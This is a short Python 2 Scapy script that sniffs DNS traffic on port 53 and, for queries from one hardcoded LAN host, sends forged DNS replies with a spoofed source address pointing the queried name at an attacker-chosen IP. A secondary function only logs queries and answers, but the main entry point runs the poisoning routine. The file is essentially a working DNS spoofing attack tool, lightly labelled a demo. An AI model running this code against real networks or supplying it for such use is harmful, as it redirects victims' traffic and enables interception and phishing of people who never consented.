
from scapy.all import *
conf.verb = 0


def dns_posion(pkt):

    """ parse dns request / response packet """
    if pkt and pkt.haslayer('UDP') and pkt.haslayer('DNS'):
        ip = pkt['IP']
        udp = pkt['UDP']
        dns = pkt['DNS']

        # dns query packet
        if int(udp.dport) == 53:
            qname = dns.qd.qname
            domain = qname[:-1]

            print "\n[*] request: %s:%d -> %s:%d : %s" % (
                ip.src, udp.sport, ip.dst, udp.dport, qname)

            # match posion domain (demo, maybe not explicit)
            if ip.src == "192.168.0.11":

                posion_ip = "192.168.0.28"

                # send a response packet to (dns request src host)
                pkt_ip = IP(src=ip.dst,
                            dst=ip.src)

                pkt_udp = UDP(sport=udp.dport, dport=udp.sport)

                # if id is 0 (default value) ;; Warning: ID mismatch
                pkt_dns = DNS(id=dns.id,
                              qr=1,
                              qd=dns.qd,
                              an=DNSRR(rrname=qname, rdata=posion_ip))
                send(pkt_ip/pkt_udp/pkt_dns)


def dns_sniff(pkt):
    """ parse dns request / response packet """
    if pkt and pkt.haslayer('UDP') and pkt.haslayer('DNS'):
        ip = pkt['IP']
        udp = pkt['UDP']
        dns = pkt['DNS']

        # dns query packet
        if int(udp.dport) == 53:
            qname = dns.qd.qname

            print "\n[*] request: %s:%d -> %s:%d : %s" % (
                ip.src, udp.sport, ip.dst, udp.dport, qname)

        # dns reply packet
        elif int(udp.sport) == 53:
            # dns DNSRR count (answer count)
            for i in range(dns.ancount):
                dnsrr = dns.an[i]
                print "[*] response: %s:%s <- %s:%d : %s - %s" % (
                    ip.dst, udp.dport,
                    ip.src, udp.sport,
                    dnsrr.rrname, dnsrr.rdata)


def main():

    sniff(filter="udp port 53", prn=dns_posion)

main()